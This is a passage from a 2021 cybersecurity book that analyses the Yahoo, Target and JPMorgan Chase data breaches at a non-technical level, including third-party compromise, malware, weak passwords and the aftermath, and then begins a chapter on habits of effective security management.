exposing the  personal information of over three billion users in 2013. In 2014, Yahoo  incurred a second data breach that exposed the personal information to  Russian FSB agents.  Yahoo’s breaches were due to the same meta-level and technical root   causes that we covered in the first chapter of this book and were the largest  in history at the time that they took place. It is also notable that Yahoo  did not detect the full extent and did not disclose either the 2013 or 2014  breach until 2016, a period of two or more full years later.  As per the SEC 10-K report from 2016, an independent committee   that conducted an investigation of the Yahoo breach found that Yahoo’s  information security team was aware of the breach as early as 2014, but  Yahoo’s legal team and executives did not understand or investigate fully.10  It appears that there was a disconnect and the information security team  may have been “siloed.” Sources report that security was never a top  priority, and the security team was always left in the dark, pushed to the  side, or not given enough resources.11  Two meta-level lessons to carry away are that:    1   Security professionals need to be vocal when they   have concerns and need to help legal teams and  executives understand the implications of their  findings.  10 www.sec.gov Archives edgar data 1011006 000119312517065791   d293630d10k.htm  11 www.nytimes.com 2016 09 29 technology yahoo-data-breach-hacking.html  168   Chapter 7    the Yahoo BreaChes of 2013 and 2014    2   Management may have a bias against hearing bad  news and may have a tendency toward minimizing  or downplaying it. Instead, they should take the  “bull by the horns” and prioritize resolving bad  news aggressively to whatever extent possible. In  Chapter 9, we discuss the organizational habits  required to create a culture of security. In Chapters 10  and 11, we provide advice for board-level leadership  that includes setting the right tone for cybersecurity,  having bad news “take the elevator” whereas good  news can “take the stairs” to the top, and how to  connect business strategy with security.  On the technical front, Yahoo’s failure to protect its systems is a result   of at least three root causes:    1.  Phishing: Hackers gained an initial foothold in the  company’s network by phishing a Yahoo employee.    2.  Malware: Hackers infected and infiltrated systems,   as well as placed log cleaners onto the company’s  network to cover their tracks as they stole Yahoo  user data and code.    3.  Cookie algorithm theft and or potential   software vulnerability: As a result of a theft of  its cookie minting algorithm, and potentially any  cryptographic keys used by it, all three billion Yahoo  accounts were compromised.  Due to both the meta-level and technical root causes mentioned  earlier, the largest mega-breaches in history at the time manifested at  Yahoo in 2013 and 2014 and were finally disclosed in 2016.  169   CHAPTER 8  The Target and  JPMorgan Chase  Breaches of 2013  and 2014  In this chapter, we cover the 2013 Target breach when hackers exfiltrated  over 40 million credit card numbers and the JPMorgan Chase  JPMC   breach of 2014 when attackers stole the names and email addresses of  over 70 million customers. We cover these two mega-breaches together  because, in part, both were caused by third-party compromises.  Organizations work with many third parties, including developers  as  Cambridge Analytica was to Facebook , acquisitions  Marriott acquiring  Starwood Hotels , and customers  Dun & Bradstreet providing customers  data on businesses . As business models evolve to support more open  “platforms,” we can expect to see the reliance on third parties “ecosystems”  to increase, which makes the lessons from this chapter relevant and  applicable. In the case of Target and JPMC, both were initially breached  through a third-party supplier. The Target and JPMorgan Chase breaches  were also significant because they were the first two  mega- breaches, in  which tens of millions of records were stolen in one shot, that took place  starting in 2013 and 2014.    Neil Daswani and Moudy Elbayadi 2021  N. Daswani and M. Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_8  171   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  Target, the eighth largest American retailer, was breached in late 2013.  Ukrainian hackers breached Target through third-party Fazio Mechanical  Services, which ran the heating, ventilation, and air conditioning  HVAC  for  1800 Target stores nationwide  in addition to quite a few other retail chains .  Hackers stole over 40 million customer credit card numbers through the  point-of-sale registers and 70 million customers’ other personal information. JPMorgan Chase  JPMC , one of the largest banks in the United States,  was breached the following year in 2014. The FBI linked the JPMC breach  to Israeli and Russian hackers who accessed over 90 bank servers and  stole names, emails, phone numbers, and addresses of over 83 million  customers. The attack began with a JPMC third-party website vendor,  Simmco, that hosted the bank’s Corporate Challenge online platform  which was used to organize charitable races.  The proverb “you are only as strong as your weakest link” applies well  to managing third parties. Third parties should be treated as an extension  of the organization itself that can ideally be secured at the same level of  rigor as the organization itself. Third-party suppliers were the initial point  of compromise for Target and JPMC, and both of their third-party suppliers  were compromised due to phishing, malware, and inadvertent employee  mistakes.   Why Target? Why the HVAC Supplier? Before we dive into how this cyberattack occurred, let’s look at what made  Target such an attractive victim and how the attackers infiltrated Target1  through Fazio Mechanical Services.  1 We cannot know for sure if the attack on Fazio Mechanical led attackers to  victimize Target or whether Target was the initial mark. In the former case,  attackers most likely cast a far and wide net when running an email malware  scam to then see what victims look like promising leads. The second scenario  is that attackers initially went after Target because it is a large retailer that had  publicly exposed plenty of internal documentation.  172   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  Target, as a large retailer, works with many vendors to keep its supply   chain running. Customers can go to www.target.com and access information  such as the catalog of what Target sells, how to contact customer support,  and other services. In addition to providing customers information on its  website, Target provided information to its suppliers and potential suppliers  on its public website, including how to send invoices, create work orders,  and get paid for their services. Target provided a plethora of internal  documentation for new and existing vendors on public-facing websites that  did not require a login—no authentication or authorization allowed anyone  from anywhere in the world to access the sensitive data. Anyone who did  a Google search for "target vendor portal" could quickly come across  Target’s Supplier Portal2 and browse through the plethora of documentation  Target publicly hosts for its suppliers. The Target Supplier Portal also led to  other Target pages such as the Target Facilities Management page, which  included the Suppliers Download page, from which anyone could download  a full list of all of the vendors that Target used.  If you were to download the list of Target HVAC vendors from the FM_  HVAC_Oct_2011_Summary.xlsx Excel file on the Target Supplier3 Portal, you  would find in the metadata4 of this file that it was created in June 2011 with   2 Note that all of Target’s public vendor pages have been taken down or are now  privately hosted since the breach in 2013. Some of the URLs Target previously  used are listed as follows. Spot a pattern? 3 Target’s Supplier Portal:  https:  extpol.target.com SupplierPortal index.html  Target Facilities Management:  https:  extpol.target.com SupplierPortal   facilitiesManagement.html  List of Target’s Vendors:    https:  extpol.target.com SupplierPortal   downloads.html 4 Metadata is data that describes other data. For example, when you take a photo  with your phone, the picture is saved along with metadata that includes the  location where the photo was taken, the settings of the camera when the photo  was taken, and the size and resolution of the photo. If you use Google Photos,  you can see all this metadata by viewing the details of the photo. In the case of a  Microsoft Excel file, metadata can include when the file was created, when it was  last edited, and who last edited the file.  173   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  a Microsoft Office 2007 license. The metadata also included the last user  to edit the file, Windows user Daleso.Yadetta, and that HVAC file was last  printed on Target’s network at the Windows domain \\TCMPSPRINT04P\.  From a simple Google search, one could discover that Daleso Yadetta was  an employee who worked at Target for eight years. There is much data and  metadata that could be gleaned from a single file, so one can imagine the  information the hackers were able to piece together from all of the publicly  hosted Target pages. For those who are familiar with the field of digital  forensics, it is no surprise that so much information can be extracted.  Target left itself vulnerable with all this publicly accessible data.  Third-party documentation may seem trivial, but such information   is far from trivial—it can and was used to set up a successful attack.  One of the themes that we will discuss in the second part of the book is  the practice of “secure by design” philosophy. You should only provide  information on a need-to-know basis and provide system access based  on the principle of least privilege. That is, people should be given only the  minimum access required for them to do their jobs. In the case of Target,  there really was not a need for the entire Internet to know or be able to  access the list of all of Target’s suppliers.   The Attack: A Black Friday Nightmare Two months before the Target breach, hackers launched an email malware  scam against Fazio Mechanical Services, one of Target’s less sophisticated  suppliers. In an email malware scam, attackers send out emails to victims  that contain links or attachments to malware. If the unsuspecting victim  falls for the attack, malware is downloaded onto their computer and run. At least one employee was duped, and once the malicious email was   clicked, Citadel malware was downloaded onto the employee’s computer.  Citadel is a password-stealing bot program, and once the malware ran,  hackers just had to wait for the employee to log in to the Target network   174   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  once. By eavesdropping on the login, Citadel acquired the employee’s  Active Directory credentials.5 Once the hackers acquired the credentials,  they were able to log in to Target’s network.  For this breach, it is important to know almost all Target contractors  use an external billing system called Ariba. Ariba has functionality that  allows contractors to upload invoices, for example, such that contractors  can keep track of the work they do and then get paid by Target.  Aorato,6 an Israeli hybrid cloud security startup, suggests that hackers  were able to leverage a vulnerability in Ariba’s web application and upload  an executable PHP file. This executable file let hackers run commands of  their choice. The hackers were able to query Target’s active directory and  probe Target’s network. Aorato believes the hackers used a well-known  technique called “Pass-the-Hash” to gain access to the hash token of  an Active Directory administrator. Once logged in as an administrator,  hackers created their own administrator account and were free to roam  around Target’s network. As will be discussed in the upcoming section on  Verizon’s audit of Target’s network post the breach, auditors found that the  Target network had almost no network segmentation.  Once a user—authorized or unauthorized—logged in to the system,   they could access nearly every part of Target’s network. Segmenting  networks into zones with varying degrees of trust and data sensitivity  is good practice, such that if one part of a network is compromised, it  does not automatically allow attackers to access other parts of a network.  Unfortunately, for Target, the point-of-sale registers and systems were  connected to the same flat network where every employee had access.  5 An Active Directory is a live directory or database that stores information such  as user accounts and other sensitive data. Active directory credentials would  authenticate a user to access the said active directory. 6 Aorato’s analysis of the breach matches with details of the breach provided by  Krebs on Security insider sources.  175   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  Based on the lack of network segmentation and security in general  as  discussed later on , there are many ways hackers could have breached the  Target network. Once they gained access to Target’s PoS systems, the attackers  installed a “RAM scraper” on the PoS registers. A RAM scraper is a malware  program that can copy sensitive data out of the memory of a device. A RAM  scraper by the name of BlackPOS on the black market was used in the attack  against Target. The attackers customized their BlackPOS RAM scraper to  run undetected in specific environments. BlackPOS recorded the credit card  numbers from the memory of Target’s PoS register. Days after Target realized  the breach someone uploaded a copy of the customized BlackPOS used  on Target’s PoS registers to threatexpert.com, a malware scanning service  owned by the cybersecurity company Symantec.  From the report in Figure 8-1, you can see that hackers  username:   Best1_user, password: BackupU$r  established a connection with Target’s  network  ttcopscli3as  in Brooklyn Park, Minnesota. The ttc in the domain  name ttcopscli3as is probably an acronym for Target Technology Center,  aka the name of Target’s Minnesota campus.   176   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  Figure 8-1.  This image shows that hackers  username: Best1_ user, password: BackupU$r  connected with Target’s network   ttcopscli3as 7   Target’s Real-Time Attack Response As one of the largest American retailers, Target did have several defensive  mechanisms in place. For instance, Target had multiple anti-malware  tools in place to protect itself. Six months before the data breach, Target  spent $1.6 million on anti-malware software products from FireEye. In  addition to the newly deployed FireEye software, Target also had deployed  Symantec Endpoint Protection  SEP  and had a team of FireEye security  specialists in Bangalore monitoring Target’s network and security 24 7.   Early Warnings The anti-malware countermeasures sounded the alarm. The Bangalore  team that monitored FireEye alerts noticed the malware and informed  Target headquarters in Minneapolis. Target’s deployment of SEP software   7 Source: http:  krebsonsecurity.com wp-content uploads 2014 01   POSWDS-ThreatExpert-Report.pdf  177   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  also raised alarms and pointed to possible compromised servers—the  same servers FireEye software was flagging. FireEye software has a feature  that automatically removes malware as it is detected. That feature was  unfortunately turned off, as false positive alerts sometimes cause business  disruption when files are automatically removed or quarantined.  The specific malware classification the FireEye software provided   Target to describe the malware was malware.binary. This categorization  is fairly generic, and a large company like Target gets hundreds of these  warnings every day. These warnings also came during the busiest  shopping day of the year, Black Friday  the day after the US Thanksgiving  holiday . Molly Snyder, a Target spokesperson, commented vaguely saying:  Through our investigation, we learned that after these crimi- nals entered our network, a small amount of their activity was  logged and surfaced to our team. That activity was evaluated  and acted upon. Based on their interpretation and evaluation  of that activity, the team determined that it did not warrant  immediate follow up.8  The facts indicated that Target knew about the malware infections, had  the opportunity to act, but having good anti-malware countermeasures was  not enough. The malware classification was too generic and not specific  enough that Target personnel felt they should be acted upon. In addition,  there were so many generic alerts being generated that there was not  enough “signal” compared to the “noise” being generated. A successful  deployment of anti- malware countermeasures should result in a scenario in  which each alert is high fidelity enough that it makes sense to act upon each  alert. Else, if so many alerts are generated that one cannot have enough  confidence in each alert, all the alerts stand to be ignored, leaving an open  window for a breach to occur despite detections.  8 Source: www.reuters.com article target-breach target-says-it-declined- to-act-on-early-alert-of-cyber-breach-idINDEEA2C0LV20140313  178   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014   A Timeline and the Stolen Data Target’s network was first breached in mid-November 2013. Between  mid- and late November 2013, attackers successfully uploaded their  malicious software to a select number of PoS registers for testing. By the  end of November, attackers successfully launched their fully functioning  malicious software to the majority of Target stores nationwide. The  attackers were able to collect records of all transactions, including credit  card numbers, between the end of November and mid-December, during  the busiest shopping weeks for Americans, including Black Friday and the  bulk of Christmas shopping. On December 15, 2013, Target realized its  network was breached, and three days later, the breach was exposed by  Brian Krebs via his KrebsOnSecurity blog. Target came forward with news  of the breach on the same day.  The Target data breach resulted in 40 million credit card numbers and  the personally identifiable information  PII  of over 70 million customers  being stolen. PII exposed in this breach included customer names, emails,  phone numbers, and more. Customers were finding out their credit card  information was compromised when banks notified them that they made  a $900 purchase for oil in Russia, or their debit card had been drained  and was in overdraft  true stories! . About one in three, or 110 million  Americans, were affected by this data breach in one way or another in 2013.   Fazio Paid for Not Paying for Anti-virus Understanding the security vulnerabilities of both Fazio Mechanical and  Target paints a clear picture of what flaws in the two security systems  allowed the attackers to penetrate the systems and what preventative  measures could have been taken to create a more secure and robust  network. Fazio Mechanical was using a free version of the Malwarebytes  anti-malware software as its primary way to detect malware on its systems.   179   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  Due to its use of Malwarebytes’ free version, and its configuration, it took  Fazio a long time to discover the email malware in its internal network.  Malwarebytes anti-malware software is a very well-known and well-  regarded anti-malware tool, but there are two concerns with the way Fazio  was using the software:    1.  The free version of the software does not scan   software in real time and is an on-demand software  scanner. Rather than continually scanning a system,  the free version will scan a system when an input is  triggered, such as clicking a button that says Scan  System Now. The professional version of the software,  which was not deployed at Fazio Mechanical  Services, does scan a system in real time.    2.  The free version of this software was made   specifically for individuals, and its license prohibits  corporate use. Malwarebytes has specific software  for businesses to protect from attacks such as the  one to which Fazio fell victim.   The Verizon Auditors Within days of discovering the breach, Target hired Verizon security  experts to audit Target’s network. KrebsOnSecurity obtained a copy of  Verizon’s confidential investigation report in late 2015. Verizon auditors  state in the report that once in the Target network, there were “no controls  limiting their access to any system, including devices within stores such as  point-of-sale  PoS  registers and servers.”9  9 Source: https:  krebsonsecurity.com 2015 09 inside-target-corp-  days-after-2013-breach   180   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  Verizon security experts found a slew of vulnerabilities that made the  Target network extremely susceptible to an attack. At one point, Verizon  consultants were able to communicate directly with Target’s PoS registers  after they compromised a network-enabled deli meat scale in a different  store. Each of the vulnerabilities Verizon consultants found is listed as  follows:    1.  Lack of network segmentation: A lack of   segmentation played a crucial role in hackers being  able to access the PoS registers using stolen third- party credentials.    2.  Weak and default passwords: Verizon security  experts found that Target had a password policy  that was not enforced and therefore not followed by  all employees. Consultants found files on multiple  servers in the Target network that contained valid  network credentials. Many systems were also using  weak or default passwords, and the Verizon team  gained access to these systems quickly. Default and  weak passwords allowed the consultants to escalate  their privilege to administrators, which allowed  them to move freely around Target’s entire network.  Within a week, security consultants cracked 86%  of Target’s network credentials  472,308 of 547,470  passwords , and the Verizon team had almost full  control of everything in Target. Figure 8-2 shows  some of the top passwords Verizon cracked during  their week at Target. Over 5% of the passwords were  some version of the word Target, stores, train, or  summer.  181   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014    3.  Misconfigured services: Verizon experts also found   that Target was using misconfigured Microsoft  SQL servers and Apache Tomcat servers. The  misconfigured servers initially allowed consultants  to access the Target network. The default password  on the servers was another way for consultants to  escalate their privilege and gain control of the Target  network. This is an additional network vulnerability  that was not used by the attackers.    4.  Outdated software: Lastly, experts found that  Target had not updated its server software for  security patches. Just like we update our laptops  or cell phones, servers receive updates that, in  many cases, patch, or fix, security vulnerabilities  found. Verizon consultants were able to exploit  the known vulnerabilities in the old software and  control Target’s network without any authentication  credentials.  182   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  Figure 8-2.  Many Target employees were using weak or default  passwords, and this table shows statistics of the passwords Verizon  auditors were able to crack   The Aftermath After the dust settled, Target was held accountable for the breach and paid  reparations to affected parties. Although Target was certified compliant  with the Payment Card Industry Data Security Standard  PCI DSS  at the  time of its breach, it clearly was not secure against breach and made it  clear that compliance does not ensure security.10 Being compliant with PCI  DSS also did not protect Target from financial accountability from the card  brands in the aftermath of the breach. Target paid credit card issuers for    10 https:  blogs.gartner.com avivah-litan 2014 01 20 how-pci-failed-  target-and-u-s-consumers :~:text=Target%20and%20other%20breached%20 entities,didn’t%20stop%20their%20breaches  183   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  the cost of reissuing cards to customers. Visa alone received $67 million  from Target as part of a settlement agreement. Target also settled a class  action lawsuit for $10 million. Victimized customers could be paid up to  $10,000 in damages. Brian Yarbrough, a consumer research analyst with  Edward Jones estimates that the average settlement was between $50 and  $100.11  All in all, it is estimated that the data breach cost Target over $250  million, even accounting for the $90 million Target received from its  insurance claims. Target’s sales for December 2013 fell 3–4%. Within six  months of the breach, Target’s CEO and CISO were fired and replaced with  new leadership. This was the first mega-breach where the CEO and CISO  were both fired. Security is an issue for which the CEO was ultimately held  accountable. As such, security is not just an IT problem. It is an issue that  spans across many departments at a company, and the buck stops at the  CEO.  Target took significant steps to improve its security following the   breach. Target mentioned in an online blog post that since the attack the  company12:     Enhanced monitoring and logging: Implemented   additional rules and alerts, centralized log feeds, and  enabled additional logging capabilities.      Installed application whitelisting for point-of-sale  systems, including deployment to all registers, point-  of- sale servers, and development of whitelisting rules.  Whitelisting allows access for certain programs to  run. If a program is not whitelisted ahead of time,   11 Source: www.usatoday.com story money 2015 03 19   target-breach-settlement-details 25012949   12 Source: https:  corporate.target.com article 2014 04   updates-on-target-s-security-and-technology-enhanc  184   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  it does not get to run. Whitelisting would prevent a  non-authorized RAM scraper or Citadel malware from  running. Even if the malware is not detected by an  anti-  malware program, it will not get to run because it is not  whitelisted.      Implemented enhanced segmentation: Developed  point-of-sale management tools, reviewed and  streamlined network firewall rules, and developed a  comprehensive firewall governance process.     Reviewed and limited vendor access:   Decommissioned vendor access to the server impacted  in the breach and disabled select vendor access points,  including FTP and telnet protocol.     Enhanced security of accounts: Coordinated a   reset of 445,000 Target team member and contractor  passwords, broadened the use of two-factor  authentication, expanded password vaults, disabled  multiple vendor accounts, reduced privileges for  certain accounts, and developed additional training  related to password rotation.  In addition to the additional security measures, Target invested   hundreds of millions of dollars into a new Cyber Fusion Center, Target’s  new security headquarters. After Target implemented its new security  protocols, Verizon performed another audit and external penetration test  in February 2014. Verizon security experts then found Target’s network to  be much more robust and less susceptible to data breaches.  185   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014   The Hackers Despite the shortcomings of Target’s and Fazio Mechanical’s security,  it is important to remember that both companies and their affected  customers were victims of a cybercrime. Target worked closely with federal  law enforcement agencies, including the US Secret Service, and the US  Department of Justice to track down the perpetrators of this criminal  act. Federal agents found a lead in the malware code that points to one  Ukrainian official named Andrey Khodyrevskiy. Federal agents found the  alias “Rescator” embedded in the malware code and found the same alias  writing posts on the online forum vor.cc for Russian hackers. Rescator says  he also went by the nickname Helkern. Federal agents were then able to  find details such as photos posted online, email addresses, and places of  employment linked between Andrey Khodyrevskiy and Helkern. There is  no definite proof Khodyrevskiy attacked Target, but the 22-year-old was  arrested two years earlier by the Ukrainian security police for being caught  in a separate hack. It is believed that Khodyrevskiy is just one of a group of  hackers who victimized Target and Fazio Mechanical.   JPMorgan Chase: One of the Largest US  Bank Breaches Twelve months after the Target breach, JPMorgan Chase Bank  JPMC   discovered a breach in its network. Attackers compromised the personal  information of over 76 million individual customers and 7 million business  customers. Like Target, JPMC was, in part, compromised by a third party.  At the time, JPMC was the largest American bank with $2.7 trillion in assets  and had stringent security protocols to protect consumer accounts from  theft or fraud. The remainder of this chapter will walk through how 83  million customers’ PII were stolen from JPMC, despite the bank spending  a quarter billion dollars on security annually.  186   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014   The Annual Race JPMC’s breach started with the entity that organized the bank’s annual  charitable race. Since 2001, JPMC has hosted the JPMorgan Corporate  Challenge across the world. Throughout the year in different cities,  participants signed up to run or walk a 3.5-mile track with their colleagues.  The revenue generated from the event was donated to local charities. In  2017 alone, the charitable event hosted a little less than 250,000 runners  from over 7300 companies.  To sign up for this cause, participants registered on the JPMorgan   Corporate Challenge website, hosted by Simmco Data Systems. Many of  JPMC’s employees participated in the annual race.  In April 2014, attackers compromised Simmco’s website certificate.13  With Simmco’s website certificate compromised, hackers intercepted all  traffic on the Corporate Challenge website, including the login credentials  made by JPMorgan Chase employees. Unfortunately, many employees  were using the same credentials for their corporate bank logins as they  were using on the Simmco Corporate Challenge website.   Hold Security Identifies Stolen Credentials Neither Simmco nor JPMC were aware of any breach in either system.  Hold Security, a security firm based in Milwaukee, had uncovered an  online repository of over one billion login credentials created by a group  of Russian hackers. The repository credentials infiltrated more than  400,000 websites, including Simmco Data Systems. As Hold Security was   13 A website certificate verifies the identity of a website to its visitors. A valid   website certificate also allows for a secure transfer of data between a website  visitor and the website. Data is securely transferred using the HTTPS protocol,  which you will see at the beginning of your URLs.  187   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014  sorting through the data, the firm contacted clients who were potentially  breached. In early August 2014, Hold Security informed JPMC security  consultants that the repository contained the usernames and passwords  of participants of the Corporate Challenge in addition to the Simmco  certificate. During this time, JPMC security consultants were aware that the  bank’s network was experiencing unusual network traffic.   JPMC Is Breached For four months, between April 2014 and August 2014, attackers tested  stolen credentials from the Simmco breach on numerous JPMC login  portals. Prior to any attacker activities, JPMC performed a routine upgrade  to its servers in which they had upgraded all the servers to require two-  factor authentication.14 Not all servers required two-factor authentication  after the upgrade, though. Within the four months of the attacker’s  probing, JPMC found an outdated server that was not using two-factor  authentication and used the stolen employee credentials to access  JPMC’s network. Attackers were tipped off that the credentials were valid  when they unlocked access to an old server hosting employee benefits  information. Attackers unfortunately only need to find one hole to get in,  whereas information security defenders have the challenge of making sure  as many holes as possible are closed.  The compromised servers contained the names, email addresses,  addresses, and phone numbers of 83 million JPMC customers. JPMC  stated that the breach was limited to personal information, and no  financial information was compromised.  14 Two-factor authentication requires a user to authenticate themselves with not   only their username and password but also a one-time second verification code.  This could be a text message with a six-digit code or a notification on a trusted  device that requires a user to click a button.  188   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014   The Aftermath JPMC’s COO Matt Zames and CISO Greg Rattray led the investigation to  trace the hackers’ origins and attempt to identify the hackers who broke  into the bank’s network. The bank executives linked the Simmco website  breach to 11 IP addresses overseas. The executives also found that those  same IP addresses had been communicating with JPMC’s network for  months.  Furthermore, hackers deleted log files that would have tracked the   attackers’ movements through the bank’s network, so it is unclear if even  JPMC knows much about the hacker’s movement through its network.  After the breach, JPMC worked closely with the NSA and FBI to analyze  the breach’s extent and track down the attackers. JPMC closed all security  loopholes concerning this breach. After the breach, JPMC CEO James  Dimon committed to doubling the bank’s security budget to half a billion  dollars annually.   The Attackers In 2015, law enforcement agencies were able to trace the JPMC breach to  five hackers. Four of the hackers were identified and indicted for not only  hacking JPMC but also E*Trade, Dow Jones, and Scottrade. Israeli and  Russian nationals Gery Shalon, Andrei Tyurin, Joshua Samuel Aaron, and  Ziv Orenstein have all been arrested and indicted on 23 counts, including  but not limited to unauthorized access of computers, identity theft,  securities and wire fraud, and money laundering. The indictment credits  Shalon as the mastermind behind the group’s illegal cyber activities. With  the stolen data, including the JPMC data, the group scammed millions of  people worldwide, earning hundreds of millions of dollars. The group’s  goal was to use the stolen data to start a brokerage firm set up as a copycat  of the American brokerage firm Merrill Lynch.  189   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014   Summary Target was breached in 2013, exposing 40 million customer credit cards  and 70 million customers’ personal information. One year later, JPMorgan  Chase Bank was breached, and hackers stole 83 million customers’  personal information. The stolen credit card information from Target left  customers susceptible to fraud, and the stolen personal information from  JPMC left customers vulnerable to targeted phishing attacks. The following  are the root causes and lessons learned from both of these breaches, in  order of importance:     Third-party supplier compromise: Target’s network  was initially breached because of a lack of third-party  security. Hackers stole network credentials from Fazio  Mechanical Services, and these stolen credentials gave  attackers a foothold into Target’s network. In the case  of JPMC, Simmco Data Systems’ website certificate was  compromised, and hackers were able to intercept bank  employees’ recycled credentials. Third parties should  be treated as an extension of an organization. Holding  third parties to just as high a level of security as your  own organization will help ensure that third parties  do not become the weakest link in an organization’s  security.     Malware: Hackers used malware in the attack against   Target, both to infect user machines and steal credit  card numbers out of the memory of PoS devices.  Companies can invest in anti-virus software, and  prioritize security, in addition to ensuring that the  CISO and their team are adequately funded to protect  against attacks and breaches. For instance, if the Target   190   Chapter 8    the target and JpMorgan Chase BreaChes of 2013 and 2014      security team was resourced well, the team could have  addressed all the security alerts generated. In addition,  the team would be able to fine-tune its security tools to  reduce the rate of false positives.  Inadvertent employee mistakes: Weak passwords  and passwords reused at multiple sites are a security  vulnerability. Despite having a strong password policy,  Target did not enforce this policy, and auditors easily  cracked 86% of the company’s network credentials.  JPMC employees were using their corporate bank  network credentials to create accounts on third-  party websites like that of Simmco. Such recycled  reused passwords left the bank exposed. Having a  strict and enforced password is an effective way to  prevent credentials from being cracked. Two-factor  authentication consistently deployed everywhere will  also ensure security when sensitive credentials are  stolen.  191   PART II  Cybersecurity  Lessons for Everyone   CHAPTER 9  The Seven Habits  of Highly Effective  Security  In our experience, managing security effectively takes not only the right  mindset but the right habits, practiced regularly. For instance, some  organizations  and to an extent basic human nature  are reactive, and  in the case of cybersecurity, it often gets more attention after a recent  incident or breach. With cybersecurity, there are always new and evolving  threats. Organizations that lose focus, becoming lax in applying the right  habits regularly, can more easily fall prey to attackers and even a public  breach. The contrary is also true—by applying the right habits regularly, an  organization can continually minimize the probability of a breach.  In The 7 Habits of Highly Effective People, Stephen Covey1 sets an   approach for personal achievement and improvement based on timeless  principles. Instead of focusing on quick self-help fixes and shortcuts,   in his seven habits, Covey identified enduring principles that produce   long- term results. We adapt Covey’s approach to apply it to the habits of  highly effective security.  1 Covey, S. R.  2020 . The 7 Habits of Highly Effective People: Powerful Lessons in  Personal Change  Anniversary ed. . New York, NY: Simon & Schuster.    Neil Daswani and Moudy Elbayadi 2021  N. Daswani and M. Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_9  195   Chapter 9    the Seven habitS of highly effeCtive SeCurity  In this chapter, we have not only brought to bear our experience but   also our consultations with many CISOs and technology leaders.   We present the seven habits of highly effective security and discuss how  these collective habits help organizations excel at managing security risks.  Our primary aim is to share a security mindset in the form of habits. The  seven habits of highly effective security are not meant to be a simple,   one-time checklist, and the habits mindset needs to be cultivated so that  it can apply to your unique environment. By definition, these habits are  meant to be broad. We recognize that security programs are not one-  size- fits-all and have their own complexity and uniqueness based on the  organization which they are meant to support.  As Ben Horowitz once wrote about running companies in The Hard   Thing About Hard Things,2 “That’s the hard thing about hard things –  there is no formula for dealing with them.” We hope that our advice and  experience can help with navigating the hard things about managing  security risks in your organization. Although there is no one exact formula  for achieving cybersecurity excellence, there does exist a combination of  art, science, and engineering that can come together to achieve security.  Some of the habits we discuss in this chapter focus on the art  e.g., Habit  1 of being proactive, prepared, and paranoid , whereas others  Habit 5 on  measuring security and Habit 6 on automation  focus on the science and  engineering aspects of achieving security.  Covey’s original book on the seven habits was originally published   in 1989. The principles based on experience and research covered  in the book are still just as relevant today as when the book was first  published, timeless and universal. Although the cybersecurity field seems  to sometimes change almost by the minute, we believe that the seven   2 Horowitz, B.  2014 . The hard thing about hard things: Building a business when  there are no easy answers. New York, NY: Harper Business.  196   Chapter 9    the Seven habitS of highly effeCtive SeCurity  habits of highly effective security are enduring and not tied to any fad or  a specific tool promoted by the hottest security vendor at any given time.  In these habits, we have attempted to apply the same rigor of distilling key  principles that have helped us lead our respective organizations through  tumultuous times as well as periods of high growth  Table 9-1 .  Table 9-1.  Seven Security Habits of Highly Effective Organizations  Seven Security Habits  habit 1. be proactive, prepared, and paranoid.  habit 2. be mission-centric.  habit 3. build security and privacy in.  habit 5. Measure security.  habit 6. automate everything.  habit 7. embrace continuous improvement.  habit 4. focus on security first; achieve compliance as a side effect.   Habit 1. Be Proactive, Prepared,  and Paranoid In Part 1 of this book, we covered some of the largest data security breaches  and privacy failures that have occurred in many organizations. Some of these  firms were technically sophisticated, with investments reaching billions of  dollars in technology spend. It is no wonder why so many managers and, by  extension, their organizations are feeling helpless against the onslaught of  security threats from well-known as well as emerging threats. However, we  believe that being proactive, prepared, and paranoid will help ensure that  you are in the best position to either discourage an attacker from making you  their next target or to reduce the “blast radius” of a breach.  197    the Seven habitS of highly effeCtive SeCurity Chapter 9   Be Proactive: Act or Be Acted Upon There are a number of actions that you can take now that will put you in  a much better position than waiting for an incident to launch you into  action. There are two choices or postures that you always have available  to you. Act and take control of your organization’s security by being  proactive, or become a reactive, complacent organization that gets acted  upon by hackers, compliance requirements, and regulators. When your  organization is in the posture to act, it empowers you to prioritize and  identify what’s most important first. Proactivity enables greater focus and  disciplined execution. Proactivity gives you the upper hand in assembling  the most talented resources you can find—both external and internal.  The proactive posture of acting also produces the best return   on investment  ROI . Proactively working with vendors to purchase  security software services when not under pressure will often lead to   1  better pricing,  2  better and more capable resources to support the  implementation, and  3  a better implementation that will help you  achieve the results from the investment faster.   On the other hand, when you’re thrown into the acted upon posture,   you’re caught off guard and on your heels. When not executing from  a position of strength and clarity, suboptimal results surely follow:  projects are executed out of sequence, more time is spent on rework,  and abandoning earlier investments altogether. All of this leads to higher  organizational thrashing, more spending, and less overall strategic value.  Based on our experience, the cost impact of being reactive vs.   proactive can be extremely high, sometimes by a factor as much as 100  times. Reactive “emergency” security work is almost always far more  expensive than a proactive and planned project. In one example, a  standard penetration test can cost three times or more the normal fees  and may need to be done in an accelerated fashion to support a client   198   Chapter 9    the Seven habitS of highly effeCtive SeCurity  request instead of conducting a penetration test that can be confidentially  shared with select clients when needed. The time to perform a  meaningful penetration test is not when the client is holding the purchase  order until the results are cleared with their security team. With rushed  execution, one may also wonder if the penetration test is just thorough  enough to meet a client timeline instead of done with no immediate  client facing 